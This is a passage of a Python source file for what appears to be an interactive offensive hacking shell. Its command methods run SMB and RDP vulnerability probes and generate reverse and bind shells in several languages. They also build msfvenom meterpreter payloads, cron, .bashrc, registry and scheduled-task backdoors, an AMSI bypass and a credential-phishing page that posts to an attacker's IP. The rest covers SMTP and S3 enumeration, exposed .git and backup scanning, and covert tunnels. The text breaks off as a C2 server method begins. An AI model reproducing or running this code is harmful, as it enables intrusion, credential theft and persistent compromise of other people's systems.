            s.send(b'\x00\x00\x00\x90\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')  
            resp = s.recv(1024)  
            s.close()  
            if b'\x00\x00\x00\x00\x00\x00\x00\x00' in resp:  
                print(f"{Colors.RED}[!] Potential MS17-010 vulnerable!{Colors.RESET}")  
            else:  
                print(f"{Colors.GREEN}[+] System appears patched{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Check failed: {e}{Colors.RESET}")  
  
    def do_smbghost(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: smbghost <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SMBGHOST CHECK (CVE-2020-0796): {target} ==={Colors.RESET}")  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(self.timeout)  
            s.connect((target, 445))  
            s.send(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00')  
            resp = s.recv(1024)  
            s.close()  
            if b'\x00\x00\x00\x00' in resp:  
                print(f"{Colors.RED}[!] Potential SMBGhost vulnerable!{Colors.RESET}")  
            else:  
                print(f"{Colors.GREEN}[+] System appears patched{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Check failed: {e}{Colors.RESET}")  
  
    def do_bluekeep(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: bluekeep <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== BLUEKEEP CHECK (CVE-2019-0708): {target} ==={Colors.RESET}")  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(self.timeout)  
            s.connect((target, 3389))  
            s.send(b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')  
            resp = s.recv(1024)  
            s.close()  
            if b'\x03\x00\x00\x0b\x06\xd0\x00\x00\x00\x00\x00' in resp:  
                print(f"{Colors.RED}[!] Potential BlueKeep vulnerable!{Colors.RESET}")  
            else:  
                print(f"{Colors.GREEN}[+] System appears patched{Colors.RESET}")  
        except:  
            print(f"{Colors.YELLOW}[!] RDP not accessible{Colors.RESET}")  
  
    def do_rdp_check(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: rdp_check <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== RDP CHECK: {target} ==={Colors.RESET}")  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(self.timeout)  
            s.connect((target, 3389))  
            data = s.recv(1024)  
            s.close()  
            if data[:3] == b'\x03\x00\x00' or b'RDP' in data:  
                print(f"{Colors.GREEN}[+] RDP service detected{Colors.RESET}")  
            else:  
                print(f"{Colors.YELLOW}[!] Port open but not RDP{Colors.RESET}")  
        except:  
            print(f"{Colors.YELLOW}[!] RDP not available{Colors.RESET}")  
  
    def do_vnc_check(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: vnc_check <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== VNC CHECK: {target} ==={Colors.RESET}")  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(self.timeout)  
            s.connect((target, 5900))  
            data = s.recv(1024)  
            s.close()  
            if b'RFB' in data:  
                print(f"{Colors.GREEN}[+] VNC detected{Colors.RESET}")  
            else:  
                print(f"{Colors.YELLOW}[!] Unknown service on 5900{Colors.RESET}")  
        except:  
            print(f"{Colors.YELLOW}[!] VNC not available{Colors.RESET}")  
  
    def do_reverse_shell(self, arg):  
        parts = arg.split()  
        if len(parts) < 2:  
            print(f"{Colors.RED}Usage: reverse_shell <lhost> <lport> [type]{Colors.RESET}")  
            return  
        lhost = parts[0]  
        lport = parts[1]  
        stype = parts[2] if len(parts) > 2 else 'all'  
        print(f"\n{Colors.BORDER}=== REVERSE SHELLS ==={Colors.RESET}")  
        print(f"{Colors.YELLOW}[i] LHOST: {lhost} LPORT: {lport}{Colors.RESET}\n")  
        shells = {  
            'bash': f'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',  
            'python': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",  
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",  
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",  
            'nc': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',  
            'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+$pwd+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',  
            'ruby': f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{lhost}\",{lport}))'",  
            'node': f'node -e "require(\'net\').connect({lport},\'{lhost}\',function(){require(\'child_process\').exec(\'/bin/sh -i\',function(e,o){this.end(o)})})"',  
        }  
        if stype == 'all':  
            for name, cmd in shells.items():  
                print(f"{Colors.GREEN}[+] {name}:{Colors.RESET}\n  {cmd}\n")  
        elif stype in shells:  
            print(f"{Colors.GREEN}[+] {stype}:{Colors.RESET}\n  {shells[stype]}\n")  
        print(f"{Colors.YELLOW}[i] Listen: nc -lvnp {lport}{Colors.RESET}")  
  
    def do_bind_shell(self, arg):  
        parts = arg.split()  
        port = parts[0] if parts else '4444'  
        print(f"\n{Colors.BORDER}=== BIND SHELLS ==={Colors.RESET}")  
        binds = {  
            'bash': f'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p {port} > /tmp/f',  
            'nc': f'nc -lvnp {port} -e /bin/bash',  
            'python': f"python3 -c 'import socket,subprocess,os;s=s.socket(s.AF_INET,s.SOCK_STREAM);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,addr=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'",  
            'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$listener=New-Object System.Net.Sockets.TcpListener(\'0.0.0.0\',{port});$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=iex $data 2>&1|Out-String;$sendback2=$sendback+\'PS \'+$pwd+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()"',  
        }  
        for name, cmd in binds.items():  
            print(f"{Colors.GREEN}[+] {name}:{Colors.RESET}\n  {cmd}\n")  
        print(f"{Colors.YELLOW}[i] Connect: nc -nv <target> {port}{Colors.RESET}")  
  
    def do_msf_payload(self, arg):  
        parts = arg.split()  
        lhost = parts[0] if parts else '192.168.1.100'  
        lport = parts[1] if len(parts) > 1 else '4444'  
        print(f"\n{Colors.BORDER}=== MSFVENOM PAYLOADS ==={Colors.RESET}")  
        print(f"{Colors.YELLOW}[i] LHOST: {lhost} LPORT: {lport}{Colors.RESET}\n")  
        payloads = [  
            f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe',  
            f'msfvenom -p windows/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o shell.exe',  
            f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf',  
            f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o shell.apk',  
            f'msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.php',  
            f'msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o shell.py',  
            f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f psh -o shell.ps1',  
            f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o shell.macho',  
        ]  
        for cmd in payloads:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}\n")  
  
    def do_encrypt(self, arg):  
        if not arg:  
            print(f"{Colors.RED}Usage: encrypt <text>{Colors.RESET}")  
            return  
        text = arg.encode()  
        print(f"\n{Colors.BORDER}=== ENCRYPTION ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] MD5: {hashlib.md5(text).hexdigest()}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] SHA1: {hashlib.sha1(text).hexdigest()}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] SHA256: {hashlib.sha256(text).hexdigest()}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] SHA512: {hashlib.sha512(text).hexdigest()}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Base64: {base64.b64encode(text).decode()}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Hex: {text.hex()}{Colors.RESET}")  
  
    def do_hash_crack(self, arg):  
        if not arg:  
            print(f"{Colors.RED}Usage: hash_crack <hash>{Colors.RESET}")  
            return  
        hlen = len(arg.strip())  
        types = {32:'MD5/NTLM',40:'SHA1',56:'SHA224',64:'SHA256',96:'SHA384',128:'SHA512',60:'Bcrypt',16:'CRC16',8:'CRC32',20:'SHA1(20)'}  
        print(f"\n{Colors.BORDER}=== HASH TYPE ID ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Length: {hlen} chars -> Possible: {types.get(hlen, 'Unknown')}{Colors.RESET}")  
  
    def do_gen_password(self, arg):  
        length = int(arg) if arg and arg.isdigit() else 16  
        print(f"\n{Colors.BORDER}=== PASSWORD ({length} chars) ==={Colors.RESET}")  
        chars = string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?'  
        pwd = [random.choice(string.ascii_lowercase), random.choice(string.ascii_uppercase), random.choice(string.digits), random.choice('!@#$%^&*')]  
        pwd += [random.choice(chars) for _ in range(length - 4)]  
        random.shuffle(pwd)  
        print(f"{Colors.GREEN}[+] Password: {''.join(pwd)}{Colors.RESET}")  
  
    def do_gen_wordlist(self, arg):  
        base = arg or 'password'  
        print(f"\n{Colors.BORDER}=== WORDLIST: {base} ==={Colors.RESET}")  
        words = set()  
        words.add(base); words.add(base.lower()); words.add(base.upper()); words.add(base.capitalize())  
        for s in ['123','1234','12345','1','!','@','2024','2025','2026']:  
            words.add(base+s); words.add(base.lower()+s); words.add(base.capitalize()+s)  
        leet = {'a':['4','@'],'e':['3'],'i':['1','!'],'o':['0'],'s':['5','$'],'t':['7']}  
        for word in list(words)[:30]:  
            for c, r in leet.items():  
                if c in word:  
                    for r2 in r:  
                        words.add(word.replace(c, r2))  
        output = f"{self.output_dir}/wordlist_{base}.txt"  
        with open(output, 'w') as f:  
            f.write('\n'.join(sorted(words)))  
        print(f"{Colors.GREEN}[+] Generated {len(words)} variations -> {output}{Colors.RESET}")  
  
    def do_ssh_keygen(self, arg):  
        comment = arg or 'katviewer'  
        print(f"\n{Colors.BORDER}=== SSH KEY GEN ==={Colors.RESET}")  
        try:  
            key = RSA.generate(4096)  
            priv = key.export_key()  
            pub = key.publickey().export_key(format='OpenSSH', comment=comment)  
            priv_file = f"{self.output_dir}/katviewer_rsa"  
            pub_file = f"{self.output_dir}/katviewer_rsa.pub"  
            with open(priv_file, 'wb') as f: f.write(priv)  
            with open(pub_file, 'wb') as f: f.write(pub)  
            os.chmod(priv_file, 0o600)  
            print(f"{Colors.GREEN}[+] Private: {priv_file}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] Public: {pub_file}{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_shell_encode(self, arg):  
        if not arg:  
            print(f"{Colors.RED}Usage: shell_encode <code>{Colors.RESET}")  
            return  
        code = arg.encode()  
        print(f"\n{Colors.BORDER}=== SHELLCODE ENCODING ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Base64: {base64.b64encode(code).decode()}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Hex: {code.hex()}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] MSF Format: {''.join(f'\\\\x{b:02x}' for b in code)}{Colors.RESET}")  
        xor = bytes(b ^ 0x41 for b in code)  
        print(f"{Colors.GREEN}[+] XOR(0x41): {xor.hex()}{Colors.RESET}")  
  
    def do_email_enum(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: email_enum <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== EMAIL ENUM: {target} ==={Colors.RESET}")  
        users = ['admin','info','support','sales','contact','help','webmaster','postmaster','noreply','marketing','billing','hr','jobs','careers','security','root','test','demo','office','hello','feedback','orders','services','team','it','dev','sysadmin','network','mail','blog','press','media','social','facebook','twitter']  
        for user in users:  
            email = f"{user}@{target}"  
            try:  
                answers = dns.resolver.resolve(target, 'MX', lifetime=5)  
                for mx in answers:  
                    mx_host = str(mx.exchange).rstrip('.')  
                    try:  
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                        s.settimeout(5)  
                        s.connect((mx_host, 25))  
                        s.recv(1024)  
                        s.send(b'HELO test.com\r\n'); s.recv(1024)  
                        s.send(b'MAIL FROM:<test@test.com>\r\n'); s.recv(1024)  
                        s.send(f'RCPT TO:<{email}>\r\n'.encode())  
                        resp = s.recv(1024)  
                        s.send(b'QUIT\r\n'); s.close()  
                        if b'250' in resp or b'451' in resp:  
                            print(f"{Colors.GREEN}[+] Valid: {email}{Colors.RESET}")  
                    except:  
                        pass  
                    break  
            except:  
                pass  
  
    def do_smtp_enum(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: smtp_enum <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SMTP USER ENUM: {target} ==={Colors.RESET}")  
        users = ['root','admin','administrator','user','test','guest','info','support','sales','postmaster','webmaster','nobody','operator','backup','mail','ftp','apache','www-data','mysql','oracle','postgres']  
        for user in users:  
            try:  
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                s.settimeout(self.timeout)  
                s.connect((target, 25))  
                s.recv(1024)  
                s.send(b'EHLO test.com\r\n'); s.recv(1024)  
                s.send(b'MAIL FROM:<test@test.com>\r\n'); s.recv(1024)  
                s.send(f'RCPT TO:<{user}>\r\n'.encode())  
                resp = s.recv(1024)  
                s.send(b'QUIT\r\n'); s.close()  
                if b'250' in resp or b'251' in resp:  
                    print(f"{Colors.GREEN}[+] User exists: {user}{Colors.RESET}")  
            except:  
                pass  
  
    def do_s3_enum(self, arg):  
        target = arg or 'example'  
        print(f"\n{Colors.BORDER}=== S3 BUCKET ENUM: {target} ==={Colors.RESET}")  
        suffixes = ['','-backup','-data','-files','-assets','-media','-static','-public','-private','-uploads','-downloads','-store','-bucket','-prod','-dev','-stage','-test','-staging','-demo','-logs','-backups','-archive','-old','-new','-temp','-images','-img','-css','-js','-src','-source','-code','-web','-website','-site','-app','-api','-admin','-cdn','-content','-config','-db','-database','-email','-mail','-keys','-secret','-secrets','-storage','-system','-upload','-user','-users','-video']  
        for suffix in suffixes:  
            url = f"https://{target}{suffix}.s3.amazonaws.com"  
            try:  
                resp = requests.head(url, timeout=5)  
                if resp.status_code in [200, 301, 403]:  
                    print(f"{Colors.GREEN}[+] {url} - Status: {resp.status_code}{Colors.RESET}")  
            except:  
                pass  
  
    def do_git_dump(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: git_dump <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== GIT DUMP: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Try: git-dumper {target}/.git/ {self.output_dir}/git_repo/{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Try: wget -r --no-parent {target}/.git/{Colors.RESET}")  
        endpoints = ['/.git/config','/.git/HEAD','/.git/index']  
        for ep in endpoints:  
            try:  
                resp = requests.get(f"{target.rstrip('/')}{ep}", timeout=5, verify=False)  
                if resp.status_code == 200:  
                    print(f"{Colors.GREEN}[+] Found: {ep}{Colors.RESET}")  
                    print(f"  {resp.text[:200]}")  
            except:  
                pass  
  
    def do_backup_scan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: backup_scan <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== BACKUP SCAN: {target} ==={Colors.RESET}")  
        files = ['.env','.env.backup','.env.old','.env.local','config.php','config.php.bak','wp-config.php','wp-config.php.bak','database.yml','dump.sql','backup.sql','db.sql','backup.tar.gz','backup.zip','site.tar.gz','site.zip','www.tar.gz','www.zip','app.tar.gz','app.zip','old.tar.gz','old.zip']  
        for bf in files:  
            try:  
                resp = requests.get(f"{target.rstrip('/')}/{bf}", timeout=5, verify=False, allow_redirects=False)  
                if resp.status_code == 200 and len(resp.content) > 10:  
                    print(f"{Colors.GREEN}[+] Found: {bf} ({len(resp.content)} bytes){Colors.RESET}")  
            except:  
                pass  
  
    def do_cve_search(self, arg):  
        if not arg:  
            print(f"{Colors.RED}Usage: cve_search <CVE-ID>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== CVE LOOKUP: {arg} ==={Colors.RESET}")  
        try:  
            resp = requests.get(f'https://cve.circl.lu/api/cve/{arg}', timeout=10)  
            data = resp.json()  
            if 'error' not in data:  
                print(f"{Colors.GREEN}[+] ID: {data.get('id', arg)}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] Summary: {data.get('summary', 'N/A')}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] CVSS: {data.get('cvss', 'N/A')}{Colors.RESET}")  
                print(f"{Colors.GREEN}[+] Published: {data.get('Published', 'N/A')}{Colors.RESET}")  
            else:  
                print(f"{Colors.YELLOW}[!] CVE not found{Colors.RESET}")  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_exploit_search(self, arg):  
        if not arg:  
            print(f"{Colors.RED}Usage: exploit_search <query>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== EXPLOIT SEARCH: {arg} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Check: https://www.exploit-db.com/search?q={arg}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Or: searchsploit {arg}{Colors.RESET}")  
  
    def do_metasploit_commands(self, arg):  
        print(f"\n{Colors.BORDER}=== METASPLOIT COMMANDS ==={Colors.RESET}")  
        cmds = ['msfconsole -q','use exploit/multi/handler','set PAYLOAD windows/meterpreter/reverse_tcp','set LHOST 0.0.0.0','set LPORT 4444','exploit -j','use exploit/windows/smb/ms17_010_eternalblue','use exploit/multi/http/tomcat_mgr_upload','use exploit/unix/webapp/wp_admin_shell_upload','use post/windows/gather/hashdump','run post/multi/recon/local_exploit_suggester']  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
  
    def do_wpscan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: wpscan <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== WPSCAN COMMANDS ==={Colors.RESET}")  
        cmds = [f'wpscan --url {target} --enumerate vp --plugins-detection mixed',f'wpscan --url {target} --enumerate u',f'wpscan --url {target} --passwords /usr/share/wordlists/rockyou.txt --usernames admin']  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
  
    def do_nikto_scan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: nikto_scan <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== NIKTO COMMANDS ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] nikto -h {target} -ssl -Format html -o {self.output_dir}/nikto.html{Colors.RESET}")  
  
    def do_gobuster_scan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: gobuster_scan <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== GOBUSTER COMMANDS ==={Colors.RESET}")  
        cmds = [f'gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t {self.threads}',f'gobuster dns -d {target} -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -t {self.threads}']  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
  
    def do_sqlmap_basic(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: sqlmap_basic <url>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SQLMAP COMMANDS ==={Colors.RESET}")  
        cmds = [f'sqlmap -u "{target}" --batch --random-agent',f'sqlmap -u "{target}" --batch --dbs',f'sqlmap -u "{target}" --batch -D database --tables',f'sqlmap -u "{target}" --batch -D database -T users --dump',f'sqlmap -u "{target}" --batch --os-shell']  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
  
    def do_persistence(self, arg):  
        print(f"\n{Colors.BORDER}=== PERSISTENCE METHODS ==={Colors.RESET}")  
        methods = {  
            'Linux Cron': '* * * * * /bin/bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"',  
            'Linux SSH Key': 'echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys',  
            'Linux .bashrc': 'echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &" >> ~/.bashrc',  
            'Windows Registry': 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "powershell -enc <base64>"',  
            'Windows Schtasks': 'schtasks /create /tn "Backdoor" /tr "powershell -enc <base64>" /sc onstart /ru SYSTEM',  
            'Windows Startup': 'copy backdoor.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',  
        }  
        for method, cmd in methods.items():  
            print(f"{Colors.GREEN}[+] {method}:{Colors.RESET}\n  {cmd}\n")  
  
    def do_evasion(self, arg):  
        print(f"\n{Colors.BORDER}=== EVASION TECHNIQUES ==={Colors.RESET}")  
        techs = {  
            'AMSI Bypass': "powershell -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",  
            'ETW Bypass': 'Patch EtwEventWrite with ret instruction',  
            'Process Hollowing': 'Create suspended process, unmaps original image, writes malicious image',  
            'DLL Injection': 'Open target process, allocate memory, write DLL path, create remote thread',  
            'Windows Defender Exclusion': 'Add-MpPreference -ExclusionPath C:\\Windows\\Tasks',  
            'Sandbox Detection': 'Check for debugger, VM artifacts, disk size < 60GB, RAM < 2GB',  
            'String Obfuscation': 'XOR strings at rest, decrypt at runtime',  
        }  
        for tech, desc in techs.items():  
            print(f"{Colors.GREEN}[+] {tech}:{Colors.RESET}\n  {desc}\n")  
  
    def do_phishing(self, arg):  
        target = arg or 'example.com'  
        print(f"\n{Colors.BORDER}=== PHISHING PAGE: {target} ==={Colors.RESET}")  
        html = f'<!DOCTYPE html><html><head><title>Sign In</title><style>body{{font-family:Arial;margin:50px auto;max-width:400px;padding:20px}}input{{width:100%;padding:10px;margin:5px 0}}button{{width:100%;padding:10px;background:#0078d4;color:white;border:none}}</style></head><body><h2>Sign in to {target}</h2><form method="POST" action="http://YOUR_IP:8080/capture"><input type="email" name="email" placeholder="Email" required><br><input type="password" name="password" placeholder="Password" required><br><button type="submit">Sign in</button></form></body></html>'  
        print(f"{Colors.GREEN}[+] HTML page generated{Colors.RESET}")  
        print(f"{Colors.YELLOW}[i] Set up capture: python3 -m http.server 8080{Colors.RESET}")  
  
    def do_dns_tunnel(self, arg):  
        domain = arg or 'tunnel.example.com'  
        print(f"\n{Colors.BORDER}=== DNS TUNNEL: {domain} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] dnscat2 server: ruby dnscat2.rb --dns domain={domain} --no-cache{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] dnscat2 client: dnscat2 --dns domain={domain}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] iodine server: iodined -f -c -P password 10.0.0.1 {domain}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] iodine client: iodine -f -P password {domain}{Colors.RESET}")  
  
    def do_icmp_tunnel(self, arg):  
        target = arg or '192.168.1.100'  
        print(f"\n{Colors.BORDER}=== ICMP TUNNEL ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] ptunnel server: ptunnel -x password{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] ptunnel client: ptunnel -p {target} -lp 2222 -da 127.0.0.1 -dp 22 -x password{Colors.RESET}")  
  
    def do_http_tunnel(self, arg):  
        target = arg or '192.168.1.100'  
        print(f"\n{Colors.BORDER}=== HTTP TUNNEL ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] chisel server: chisel server --port 8080 --reverse{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] chisel client: chisel client {target}:8080 R:8888:127.0.0.1:80{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] frp server: frps -c frps.toml{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] frp client: frpc -c frpc.toml{Colors.RESET}")  
  
    def do_proxy_chain(self, arg):  
        print(f"\n{Colors.BORDER}=== PROXYCHAINS CONFIG ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] /etc/proxychains.conf:{Colors.RESET}")  
        print("  strict_chain\n  proxy_dns\n  tcp_read_time_out 15000\n  tcp_connect_time_out 8000\n  [ProxyList]\n  socks4 127.0.0.1 9050\n  socks5 127.0.0.1 1080\n  http 127.0.0.1 8080")  
  
    def do_socks_proxy(self, arg):  
        port = arg or '1080'  
        print(f"\n{Colors.BORDER}=== SOCKS PROXY :{port} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] ssh -D {port} -N -f user@remote{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] curl --socks5 127.0.0.1:{port} ifconfig.me{Colors.RESET}")  
  
    def do_ngrok_setup(self, arg):  
        proto_port = arg or 'http 80'  
        print(f"\n{Colors.BORDER}=== NGROK TUNNEL ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] ngrok {proto_port}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] ngrok tcp 22{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] ngrok config add-authtoken YOUR_TOKEN{Colors.RESET}")  
  
    def do_cloudflare_tunnel(self, arg):  
        target = arg or 'localhost:80'  
        print(f"\n{Colors.BORDER}=== CLOUDFLARE TUNNEL ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] cloudflared tunnel --url {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] cloudflared tunnel create mytunnel{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] cloudflared tunnel run mytunnel{Colors.RESET}")  
  
    def do_c2_basic(self, arg):  
        port = arg or '4444'  
        print(f"\n{Colors.BORDER}=== BASIC C2 SERVER ({port}) ==={Colors.RESET}")  
        print(f"""{Colors.GREEN}[+] Server code:{Colors.RESET}  
